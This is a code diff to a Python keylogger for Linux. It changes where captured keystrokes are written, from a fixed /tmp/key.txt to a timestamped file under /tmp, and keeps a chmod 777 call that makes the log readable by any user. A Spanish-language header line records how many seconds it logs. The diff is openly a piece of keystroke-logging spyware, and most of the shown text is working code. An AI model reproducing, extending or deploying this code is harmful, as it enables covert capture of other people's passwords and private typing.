@@ -10,12 +10,12 @@
 #			      #
 ###############################
 #from sys import argv
-import sys,os
+import sys,os,datetime
 from time import sleep, time
 import ctypes as ct
 from ctypes.util import find_library
 
-
+nombre = "/tmp/" + datetime.datetime.now().isoformat() + "keylogger.key"
 # linux only!
 assert("linux" in sys.platform)
 
@@ -194,15 +194,15 @@ def log(done, callback, sleep_interval=.005):
 
 
 def print_keys(t, modifiers, keys):  
-    fo = open("/tmp/key.txt","a")
+    fo = open(nombre,"a")
     fo.write(keys)
     fo.close()
-    os.system("chmod 777 /tmp/key.txt")
+    os.system("chmod 777 "+nombre)
     #print "%r" % ( keys)
 
 #if __name__ == "__main__":
 def keylog(t): 
-    fo = open("/tmp/key.txt","w")
+    fo = open(nombre,"w")
     fo.write("keylogger por " + str(t) + " segundos"+"\n")
     fo.close()
     now = time()
